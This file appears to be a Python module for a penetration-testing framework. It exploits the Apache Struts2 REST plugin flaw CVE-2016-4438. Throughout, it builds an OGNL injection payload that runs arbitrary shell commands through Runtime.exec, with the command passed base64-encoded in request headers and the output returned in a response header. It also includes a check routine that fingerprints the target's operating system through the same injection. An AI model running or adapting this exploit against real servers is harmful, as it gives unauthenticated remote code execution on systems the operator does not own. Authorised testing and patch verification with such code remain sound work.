import os,sys,time,cgi,base64,random,re
from lib.common import http
from urllib import quote

class Module:
    def __init__(self,Main):
        self.main=Main
        self.info={
            'Name':'Apache Struts2 REST plugin setMethod',
            'Author':'sushan',
            'Description':'The REST plugin in Apache Struts2 2.3.20 through 2.3.28.1 allows remote attackers to execute arbitrary code via a crafted expression',
            'Comments':'http://www.cvedetails.com/cve/CVE-2016-4438'
        }
        self.options={
            'RHOST':{
                'Description':'The target address',
                'Required':False,
                'Value':''
            },
            'RPORT':{
                'Description':'The target port (TCP)',
                'Required':False,
                'Value':'8080'
            },
            'URIPATH':{
                'Description':'Path to action',
                'Required':False,
                'Value':'/'
            },
            'URL':{
                'Description':'The URL to use for this exploit',
                'Required':True,
                'Value':'http://192.168.111.135:8080/s2-037/orders/4'
            },
            'OS':{
                'Description':'Target Platform OS',
                'Required':False,
                'Value':'linux'
            }
        }

    def payload(self,cmd):
        x='''\
(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\
(#x1=@org.apache.struts2.ServletActionContext@getRequest().getHeader(1)).\
(#x2=@org.apache.struts2.ServletActionContext@getRequest().getHeader(2)).\
(#x3=@org.apache.struts2.ServletActionContext@getRequest().getHeader(3)).\
(#x1=new java.lang.String((new sun.misc.BASE64Decoder()).decodeBuffer(#x1))).\
(#x2=new java.lang.String((new sun.misc.BASE64Decoder()).decodeBuffer(#x2))).\
(#x3=new java.lang.String((new sun.misc.BASE64Decoder()).decodeBuffer(#x3))).\
(#x=@java.lang.Runtime@getRuntime().exec(#x2)).\
(#x2=@org.apache.commons.io.IOUtils@toString(#x.getInputStream())).\
(#x=#x2+@org.apache.commons.io.IOUtils@toString(#x.getErrorStream())).\
(#x=(new sun.misc.BASE64Encoder()).encodeBuffer(#x.getBytes(#x3))).\
(#context[#x1].addHeader(1,#x)).\
(#x=#context[#x1].getWriter()).(#x.println(1),#x.flush(),#x.close()).index.xml\
'''
        if self.options['OS']['Value'].lower().find('win')!=-1:
            cmd='cmd.exe /c '+cmd
        else:
            cmd='/bin/bash -c '+cmd
        return x,cmd

    def check(self):
        req=http.Http(self.options)
        a='''\
(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\
(#x=#parameters.%s[0],#context[#x].addHeader(1,@java.lang.System@getProperty(#parameters.%s[0]))).\
(#x=#context[#x].getWriter()).(#x.println(1),#x.flush(),#x.close()).index.xml\
'''
        a1=random.choice('abcdefwx')+'1'
        a2=random.choice('abcdefwx')+'2'
        req.url=req.url+'/'+quote(a % (a1,a2))
        xx=req.post({'Content-Type':'application/x-www-form-urlencoded'},a1+'=com.opensymphony.xwork2.dispatcher.HttpServletResponse&'+a2+'=os.name')
        try:
            if xx!=None and xx.status_code==200 and len(xx.headers['1'])>0:
                self.options['OS']['Value']=xx.headers['1']
                return True
            return False
        except:
            return False

    def exploit(self,cmd):
        req=http.Http(self.options)
        p,c=self.payload(cmd)
        req.url=req.url+'/'+quote(p)
        xx=req.get({'1':base64.b64encode('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),'2':base64.b64encode(c),'3':base64.b64encode('utf-8')})
        if xx!=None and xx.status_code==200:
            try:
                x=base64.b64decode(xx.headers['1'])
                return '[*] %s' % (x)
            except:
                return xx.text
        return '[!] execute cmd error.'
